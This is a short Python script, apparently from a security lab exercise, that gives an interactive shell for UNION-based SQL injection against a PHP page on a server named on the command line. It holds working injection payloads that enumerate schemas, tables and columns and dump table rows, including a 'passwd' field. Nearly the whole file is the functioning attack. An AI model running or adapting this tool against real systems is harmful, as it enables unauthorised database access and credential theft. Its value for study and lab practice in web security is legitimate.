import sys
import requests

def send_request(server_ip, query):
    url = f"http://{server_ip}/sqli/example1.php?name={query}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.text
    else:
        return f"Failed to fetch data: {response.status_code}"

def interactiveShell(server_ip):
    print("SQL inject time!")
    while True:
        cmd = input('lab3sqli> ')
        if cmd == "exit":
            print('bye-bye.')
            break
        elif cmd == "dbs":
            query = "root' +UNION+ALL+SELECT+(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),2,3,4,5--+"
            print(send_request(server_ip, query))
        elif cmd.startswith("tables "):
            db_name = cmd.split(" ")[1]
            query = f"root' +UNION+ALL+SELECT+(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA='{db_name}'),2,3,4,5--+"
            print(send_request(server_ip, query))
        elif cmd.startswith("columns "):
            parts = cmd.split(" ")
            db_name, table_name = parts[1], parts[2]
            query = f"root' +UNION+ALL+SELECT+(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='{table_name}'),2,3,4,5--+"
            print(send_request(server_ip, query))
        elif cmd.startswith("dump "):
            parts = cmd.split(" ")
            db_name, table_name = parts[1], parts[2]
            query = f"root'+UNION+ALL+SELECT+(SELECT+GROUP_CONCAT(id,'Name:',name,'age:',age,'groupid:',groupid,'passwd:',passwd+SEPARATOR+0x3c62723e)+FROM+{db_name}.{table_name}),2,3,4,5--+"
            print(send_request(server_ip, query))
        else:
            print("Unknown command. Available commands are 'dbs', 'tables <db>', 'columns <db> <table>', 'dump <db> <table>', and 'exit'.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('Usage: python lab3sqli.py <Server IP address>')
    else:
        server_ip = sys.argv[1]
        interactiveShell(server_ip)
